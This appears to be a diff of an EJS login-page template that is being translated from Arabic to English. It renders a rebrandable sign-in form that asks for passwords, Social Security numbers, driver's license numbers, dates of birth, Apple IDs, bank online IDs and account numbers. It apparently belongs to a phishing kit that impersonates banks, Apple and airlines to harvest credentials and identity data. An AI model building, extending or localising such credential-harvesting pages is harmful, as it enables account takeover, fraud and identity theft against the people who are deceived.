@@ -1,10 +1,10 @@
 <!doctype html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title><%= pageContent.headline %> — <%= tpl.name %></title>
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
   :root {
     --bg:<%= tpl.palette.bg %>;
@@ -15,7 +15,7 @@
   }
   * { box-sizing:border-box; margin:0; padding:0; }
   body {
-    font-family:'Cairo',system-ui;
+    font-family:'Inter',system-ui;
     background:var(--bg); color:var(--fg);
     min-height:100vh;
     display:flex; align-items:center; justify-content:center;
@@ -1173,20 +1173,20 @@
     <input type="hidden" name="_csrf" value="<%= csrfToken %>">
     <input type="text" name="_hp" style="display:none" tabindex="-1" autocomplete="off">
     <% const PLACEHOLDERS = {
-      email: 'البريد الإلكتروني',
-      password: 'كلمة المرور',
-      phone: 'رقم الجوال',
-      username: 'اسم المستخدم',
-      name: 'الاسم',
-      customer_id: 'رقم العميل',
-      online_id: 'هوية الإنترنت',
-      dl_number: 'رقم رخصة القيادة',
-      ssn: 'رقم الضمان الاجتماعي (SSN)',
-      dob: 'تاريخ الميلاد',
-      booking_ref: 'رقم الحجز',
-      last_name: 'اسم العائلة',
-      apple_id: 'Apple ID (البريد الإلكتروني)',
-      account_number: 'رقم الحساب'
+      email: 'Email address',
+      password: 'Password',
+      phone: 'Phone number',
+      username: 'Username',
+      name: 'Full name',
+      customer_id: 'Customer ID',
+      online_id: 'Online ID',
+      dl_number: 'Driver\'s license number',
+      ssn: 'Social Security Number (SSN)',
+      dob: 'Date of birth',
+      booking_ref: 'Booking reference',
+      last_name: 'Last name',
+      apple_id: 'Apple ID (Email)',
+      account_number: 'Account number'
     } %>
     <% pageContent.fields.forEach(f => {
       const type = f === 'password' ? 'password' : f === 'email' || f === 'apple_id' ? 'email' : f === 'phone' ? 'tel' : f === 'dob' ? 'date' : 'text';
@@ -1194,7 +1194,7 @@
     %>
       <input type="<%= type %>" name="<%= f %>" placeholder="<%= placeholder %>" autocomplete="<%= f === 'password' ? 'current-password' : 'off' %>" required>
     <% }) %>
-    <button type="submit"><%= pageContent.cta || 'تسجيل الدخول' %></button>
+    <button type="submit"><%= pageContent.cta || 'Sign In' %></button>
   </form>
 </div>
 </body>
